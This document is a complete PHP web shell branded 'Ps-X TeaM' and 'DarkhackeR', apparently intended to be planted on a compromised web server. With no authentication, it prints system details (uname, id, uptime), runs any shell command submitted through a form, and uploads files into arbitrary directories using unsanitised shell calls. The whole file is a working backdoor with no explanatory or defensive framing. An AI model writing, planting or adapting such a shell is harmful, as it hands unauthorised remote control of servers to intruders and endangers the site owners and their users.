﻿<title>Ps-X TeaM <?php echo getenv("HTTP_HOST"); ?></title>
<link rel="shortcut icon" href="http://www.pandorarecovery.com/favicon.gif" type="image/x-icon">
<body text='#999999' bgcolor="black">
<?php
$selfurl = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];
echo "
<a href=http://$selfurl style='text-decoration:none'><font face='Tahoma' size='2' color='blue'><center><b>-::- DarkhackeR -::-</b></center></font></a>
";?>

<div style='background-color:#1f1f1f;border:0px;padding:2px 10px 2px 10px;margin:10px 5px 10px 5px;font-size:12px'>
<td><pre><font color=white><blink>CyberUN1</blink></font> <font color=Lime>System  </font><font color=white>:</font> <?php system('uname -a'); ?>
<font color=white><blink>CyberUN1</blink></font> <font color=Lime>UserInfo</font><font color=white>:</font> <?php system('id'); ?>
<font color=white><blink>CyberUN1</blink></font> <font color=Lime>UpTime  </font><font color=white>:</font><?php system('uptime'); ?>
<font color=white><blink>CyberUN1</blink></font> <font color=Lime>Dir     </font><font color=white>:</font> <?php system('pwd'); ?>
<font color=white><blink>CyberUN1</blink></font> <font color=Lime>DNS     </font><font color=white>:</font> <?php echo getenv("SERVER_ADDR"); ?> - <?php echo getenv("SERVER_NAME"); ?></pre></td>
</div>

<?php

set_magic_quotes_runtime(0);

$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);

$SCWD   = `pwd`;

if( $currentWD == "" ) { $currentWD = $SCWD; }
if( $currentCMD == "" ) { $currentCMD = "ls -al"; }
if( $_POST['_act'] == "List Files!" ) { $currentCMD = "ls -al"; }

print "<div style='background-color:#1f1f1f;border:0px;padding:5px 5px 1px 5px;margin:5px;font-size:12px'>";
print "<form method=post enctype=\"multipart/form-data\"><table>";

print "<tr><td style='width:50px;color:red;font-size:12px;font-family:Verdana'>CMD</td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\" style='background-color:#2f2f2f;border: 1px solid #666666;color:#00ff00;margin:0px;font-size:12px;font-family:Verdana'></td>";
print "<td><input type=submit name=_act value=\"Execute!\" style='width:80px;background-color:#2f2f2f;border: 1px solid #666666;color:red;margin:0px;font-size:12px;font-family:Verdana'></td></tr>";

print "<tr><td style='width:50px;color:red;font-size:12px;font-family:Verdana'>Dir</td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\" style='background-color:#2f2f2f;border: 1px solid #666666;color:#00ff00;margin:0px;font-size:12px;font-family:Verdana'></td>";
print "<td><input type=submit name=_act value=\"List Files!\" style='width:80px;background-color:#2f2f2f;border: 1px solid #666666;color:red;margin:0px;font-size:12px;font-family:Verdana'></td></tr>";

print "<tr><td style='width:50px;color:red;font-size:12px;font-family:Verdana'>UpLoad</td><td><input size=85 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"UpLoad!\" style='width:80px;background-color:#2f2f2f;border: 1px solid #666666;color:red;margin:0px;font-size:12px;font-family:Verdana'></td></tr>";

print "</table></form>";
print "</div>";

$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);

if( $_POST['_act'] == "UpLoad!" ) {
if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
print "<pre><center>UpLoad Error!</center></pre>";
} else {
print "<div style='background-color:#1f1f1f;border:0px;padding:5px 5px 1px 5px;margin:5px;font-size:12px'><pre>";
system("chmod 644 ".$_FILES['_upl']['tmp_name']." 2>&1");
system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
system("ls -al ".$currentWD." 2>&1");
print "</div></pre><pre><center>UpLoad Successfully!</center></pre>";
}    
} else {
print "<div style='background-color:#1f1f1f;border:0px;padding:5px 5px 5px 5px;margin:5px;font-size:12px'><pre>";
$currentCMD = "cd ".$currentWD.";".$currentCMD;
system("$currentCMD 1> /tmp/bash 2>&1; cat /tmp/bash; rm -rf /tmp/bash");
print "</pre></div>";
}

exit;

?></body></font></font></b></font>

